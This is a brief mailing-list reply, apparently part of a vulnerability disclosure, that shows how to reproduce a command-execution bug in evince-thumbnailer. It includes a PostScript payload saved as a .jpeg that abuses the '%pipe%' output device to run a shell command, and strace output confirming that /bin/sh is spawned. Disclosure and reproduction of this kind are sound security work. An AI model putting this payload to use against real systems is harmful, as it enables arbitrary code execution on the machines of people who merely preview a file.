Thanks Amit, that's scary, it looks like they're working on it right now.

FWIW, I figured out how to reproduce the original bug here in
evince-thumbnailer:

$ cat test.jpeg
%!PS
a0
{ null restore } stopped { pop } if
(ppmraw) selectdevice
legal
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
showpage
$ strace -q -feexecve evince-thumbnailer  test.jpeg foo.out
execve("/usr/bin/evince-thumbnailer", ["evince-thumbnailer", "test.jpeg",
"foo.out"], 0x7ffeed3010d0 /* 65 vars */) = 0
execve("/bin/sh", ["sh", "-c", "id"], 0x7ffcf3ea8d18 /* 65 vars */) = 0

Tavis.
